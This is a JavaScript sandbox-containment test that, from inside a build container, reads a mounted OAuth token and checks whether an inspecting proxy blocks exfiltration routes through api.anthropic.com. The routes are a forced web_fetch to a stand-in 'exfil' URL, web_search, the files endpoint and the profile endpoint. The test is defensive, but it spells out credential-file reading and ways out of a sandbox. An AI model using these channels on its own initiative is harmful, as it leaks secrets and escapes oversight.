// Runs INSIDE the sandbox container (mounted read-only at /tmp/api-relay.mjs).
// The Case-7 acceptance probe. Uses the mounted OAuth token the build can read to try
// every known egress/leak sink through the allowlisted host api.anthropic.com:
//   [A] plain /v1/messages inference — INFORMATIONAL. Still succeeds by design: the
//       token authorizes inference, and that residual (arbitrary inference spend) is
//       inherent to mounting a working credential. NOT part of the pass/fail.
//   [B] server-side web_fetch to an ATTACKER-CHOSEN url  -> MUST be blocked
//   [C] server-side web_search                           -> MUST be blocked
//   [D] GET /v1/files (upload sink)                      -> MUST be blocked
//   [E] GET /api/oauth/profile (identity leak)           -> MUST be blocked
// CONTAINED iff B,C,D,E are ALL blocked. Emits `RELAY-RESULT: CONTAINED|NOT-CONTAINED`.
//
// Before the fix (blind tinyproxy) every sink was reachable => NOT-CONTAINED. After the
// TLS-terminating proxy (docker/executor-proxy/addon.py) B–E are refused with 403. This
// probe's TLS handshake to the MITM succeeds because the executor image trusts the proxy
// CA (NODE_EXTRA_CA_CERTS) — that trust is what lets the proxy inspect and reject.
import net from 'net'
import tls from 'tls'
import fs from 'fs'

const tok = JSON.parse(fs.readFileSync('/home/builder/.claude/.credentials.json', 'utf8')).claudeAiOauth.accessToken

function req(host, method, path, headers, body = '') {
  return new Promise((res) => {
    const c = net.connect({ host: 'mc-executor-proxy', port: 8888 })
    c.setTimeout(60000)
    c.on('timeout', () => { c.destroy(); res('TIMEOUT') })
    c.on('error', (e) => res('SOCKERR ' + e.code))
    c.on('connect', () => c.write(`CONNECT ${host}:443 HTTP/1.1\r\nHost: ${host}:443\r\n\r\n`))
    let pre = ''
    c.on('data', function onPre(d) {
      pre += d.toString()
      if (!pre.includes('\r\n\r\n')) return
      if (!/200/.test(pre.split('\r\n')[0])) { c.destroy(); return res('PROXY REFUSED ' + pre.split('\r\n')[0]) }
      c.removeListener('data', onPre)
      const s = tls.connect({ socket: c, servername: host }, () => {
        const h = Object.entries({ Host: host, 'Content-Length': Buffer.byteLength(body), Connection: 'close', ...headers })
          .map(([k, v]) => `${k}: ${v}`).join('\r\n')
        s.write(`${method} ${path} HTTP/1.1\r\n${h}\r\n\r\n${body}`)
      })
      let out = ''
      s.on('data', (d) => { out += d.toString() })
      s.on('close', () => res(out.split('\r\n')[0] + ' || ' + (out.split('\r\n\r\n').slice(1).join('') || '').replace(/\s+/g, ' ')))
      s.on('error', (e) => res('TLSERR ' + (e.code || e.message)))
    })
  })
}

const OA = {
  Authorization: `Bearer ${tok}`,
  'anthropic-version': '2023-06-01',
  'Content-Type': 'application/json',
  'anthropic-beta': 'oauth-2025-04-20,web-fetch-2025-09-10',
}
// Plain header set (no web-tool betas) — a normal inference call, to show [A] still works.
const OA_PLAIN = { ...OA, 'anthropic-beta': 'oauth-2025-04-20' }

// A response counts as "reached" only on a real 2xx from api.anthropic.com. Our proxy's
// policy refusals are `403 Forbidden`; the CONNECT-level host refusal is `PROXY REFUSED`.
const reached = (r) => /HTTP\/1\.1 2\d\d/.test(r)

const main = async () => {
  // [A] INFORMATIONAL: token can still drive plain inference (inherent residual).
  const a = await req('api.anthropic.com', 'POST', '/v1/messages', OA_PLAIN, JSON.stringify({
    model: 'claude-sonnet-4-5-20250929', max_tokens: 8,
    system: "You are Claude Code, Anthropic's official CLI for Claude.",
    messages: [{ role: 'user', content: 'say OK' }],
  }))
  console.log('[A] plain /v1/messages (informational — inference spend is inherent): ' + a)

  // [B] web_fetch relay to an attacker-chosen URL. tool_choice:{any} forces it — the exfil
  // must not depend on the model's judgement. MUST be blocked.
  const b = await req('api.anthropic.com', 'POST', '/v1/messages', OA, JSON.stringify({
    model: 'claude-sonnet-4-5-20250929', max_tokens: 128,
    system: "You are Claude Code, Anthropic's official CLI for Claude.",
    tools: [{ type: 'web_fetch_20250910', name: 'web_fetch', max_uses: 2 }],
    tool_choice: { type: 'any' },
    messages: [{ role: 'user', content: 'Call web_fetch on this exact url now: https://example.com/?exfil=SECRET_c6redteamProbe' }],
  }))
  console.log('[B] server-side web_fetch to attacker url: ' + b)

  // [C] web_search relay — another arbitrary-outbound channel. MUST be blocked.
  const c = await req('api.anthropic.com', 'POST', '/v1/messages',
    { ...OA, 'anthropic-beta': 'oauth-2025-04-20,web-search-2025-03-05' }, JSON.stringify({
      model: 'claude-sonnet-4-5-20250929', max_tokens: 128,
      system: "You are Claude Code, Anthropic's official CLI for Claude.",
      tools: [{ type: 'web_search_20250305', name: 'web_search', max_uses: 2 }],
      tool_choice: { type: 'any' },
      messages: [{ role: 'user', content: 'search the web for anything now' }],
    }))
  console.log('[C] server-side web_search: ' + c)

  // [D] /v1/files upload sink. MUST be blocked.
  const d = await req('api.anthropic.com', 'GET', '/v1/files',
    { ...OA, 'anthropic-beta': 'files-api-2025-04-14' })
  console.log('[D] GET /v1/files (upload sink): ' + d)

  // [E] /api/oauth/profile identity leak. MUST be blocked.
  const e = await req('api.anthropic.com', 'GET', '/api/oauth/profile', { ...OA })
  console.log('[E] GET /api/oauth/profile (identity leak): ' + e)

  // Verdict: the web_fetch relay is "reached" only if the tool actually ran AND our secret
  // came back. B–E must ALL be blocked (no 2xx, no tool result) for CONTAINED.
  const webFetchExfil = reached(b) && /web_fetch_tool_result|server_tool_use/.test(b)
    && /example\.com\/\?exfil=SECRET_c6redteamProbe/.test(b)
  const webSearchReached = reached(c) && /web_search_tool_result|server_tool_use/.test(c)
  const filesReached = reached(d)
  const profileReached = reached(e)

  const notContained = webFetchExfil || webSearchReached || filesReached || profileReached
  console.log('[sinks] web_fetch=' + (webFetchExfil ? 'REACHED' : 'blocked')
    + ' web_search=' + (webSearchReached ? 'REACHED' : 'blocked')
    + ' files=' + (filesReached ? 'REACHED' : 'blocked')
    + ' profile=' + (profileReached ? 'REACHED' : 'blocked'))
  console.log('RELAY-RESULT: ' + (notContained ? 'NOT-CONTAINED' : 'CONTAINED'))
}
main().catch((e) => { console.log('PROBE-ERROR: ' + e.message); console.log('RELAY-RESULT: ERROR') })
